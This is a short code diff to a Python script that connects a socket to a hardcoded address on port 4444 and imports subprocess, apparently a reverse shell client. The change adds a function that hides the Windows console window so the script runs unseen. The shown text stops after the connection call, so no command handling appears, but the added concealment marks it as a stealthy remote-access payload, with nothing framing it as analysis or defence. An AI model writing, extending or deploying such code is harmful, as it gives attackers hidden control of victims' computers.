@@ -1,9 +1,17 @@
 import sys
 import socket
 import subprocess
+import win32gui
+import win32con
+
+def hide_console():
+    hwnd = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
 
 SERVER = "192.168.88.69"
 PORT = 4444
+
+hide_console()
 
 s = socket.socket()
 s.connect((SERVER, PORT))
